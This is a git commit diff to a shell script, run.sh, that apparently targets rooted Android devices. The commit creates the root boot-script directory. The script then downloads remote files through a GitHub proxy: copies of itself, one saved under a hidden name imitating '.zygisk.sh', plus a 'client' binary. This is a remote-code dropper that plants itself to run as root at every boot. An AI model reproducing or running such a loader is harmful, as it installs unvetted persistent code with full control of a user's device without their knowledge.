3d99ef40d0a0689f78e1919b1c1e506f0ce023a7
Jason Xu <jasonxu114514@163.com>
2025-10-16 01:43:06 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+mkdir /data/adb/service.d
 curl -sS -o "/data/adb/service.d/.zygisk.sh" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
 curl -sS -o "/data/adb/service.d/run.sh" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
 curl -sS -o "/data/local/tmp/client" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
